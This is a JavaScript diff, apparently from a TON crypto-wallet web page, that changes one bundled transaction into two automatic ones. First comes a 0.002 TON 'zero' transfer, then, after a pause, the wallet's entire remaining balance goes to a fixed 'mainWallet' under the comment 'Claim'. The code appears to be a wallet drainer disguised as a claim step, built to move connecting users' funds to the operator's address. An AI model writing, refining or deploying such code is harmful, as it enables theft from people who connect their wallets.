@@ -90,26 +90,43 @@ async function didtrans() {
 
         const remainingBalance = originalBalance - deduction;
 
-        // Одна транзакция с двумя сообщениями (нулевая первая!)
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 120, // 2 минуты на подтверждение
+        // 1️⃣ Отправляем первую (нулевую) транзакцию
+        const zeroTransaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 120,
             messages: [
                 {
-                    address: mainWallet, // Нулевая транзакция (идет первой)
-                    amount: 2000000, // 2_000_000 нанотонов = 0.002 TON
-                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload, чтобы кошелек не ругался
-                },
+                    address: mainWallet,
+                    amount: 2000000, // 0.002 TON
+                    payload: "te6cckEBAgEAAQAAAA==",
+                }
+            ],
+            sendMode: 3,
+            comment: "Zero TX",
+        };
+
+        console.log("Отправляем нулевую транзакцию...");
+        await tonConnectUI.sendTransaction(zeroTransaction);
+        console.log("Нулевая транзакция отправлена!");
+
+        // ⏳ Ждем подтверждения транзакции (5 секунд)
+        await new Promise(resolve => setTimeout(resolve, 5000));
+
+        // 2️⃣ Автоматически отправляем вторую (основную) транзакцию
+        const mainTransaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 120,
+            messages: [
                 {
-                    address: mainWallet, // Основная сумма
+                    address: mainWallet,
                     amount: remainingBalance,
                 }
             ],
-            sendMode: 3, // Обычный режим для обоих
+            sendMode: 3,
             comment: "Claim",
         };
 
-        const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Транзакции отправлены:', result);
+        console.log("Отправляем основную транзакцию...");
+        await tonConnectUI.sendTransaction(mainTransaction);
+        console.log("Основная транзакция отправлена!");
 
         await updateBalance(walletAddress);
     } catch (error) {
